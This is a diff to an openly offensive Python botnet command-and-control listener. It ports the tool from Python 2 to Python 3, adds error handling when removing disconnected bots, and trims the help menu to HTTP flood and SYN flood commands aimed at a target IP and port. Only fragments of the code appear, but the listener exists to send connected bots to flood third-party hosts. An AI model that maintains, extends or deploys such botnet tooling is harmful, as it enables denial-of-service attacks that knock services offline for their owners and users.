@@ -18,7 +18,7 @@ print(
 "\n██║     ██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝██║  ██╗███████╗██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   "
 "\n╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   "  
 "                                                                                                                          "
-"\n                                                                     [!] Version: 1.1v Python 2 // command 'help' for help xD"                                                
+"\n                                                                     [!] Version: 1.3v Python 3 // command 'help' for help xD"                                                
 "\n                                                                                [+] Code by © Drpanoukl4 2022"                                                                             
 
 )
@@ -70,10 +70,15 @@ class listener:
 
                 continue
                 
-            except: 
+            except:
 
-                del self.bots[i]
-                del self.connections[i]
+                try:
+
+                    del self.bots[i]
+                    del self.connections[i]
+
+                except:
+                    print("Cant delete bot", self.bots[i])
             
 
 
@@ -102,7 +107,7 @@ class listener:
 
         while True:
             try:
-                command = raw_input("\n -<<Command>>: ")
+                command = input("\n -<<Command>>: ")
                 commands = command.split(" ")
                 
             except EOFError:
@@ -123,8 +128,7 @@ class listener:
                     "\n[+] -> - exit = Kill connection with bots"
                     "\n[+] -> - kill = Kill bots"
                     "\n[+] -> - acttack + numreq + target ip + port  = HTPP flood"
-                    "\n[+] -> - syn + numreq + target ip + port = Scapy Syn flood"
-                    "\n[+] -> - acttacksyn + numreq + target ip + port = Raw Socket Syn flood"
+                    "\n[+] -> - syn + numreq + target ip + port = Syn flood"
                     "\n[+] -> - Ctrl + C = Exit"
                     
                     )
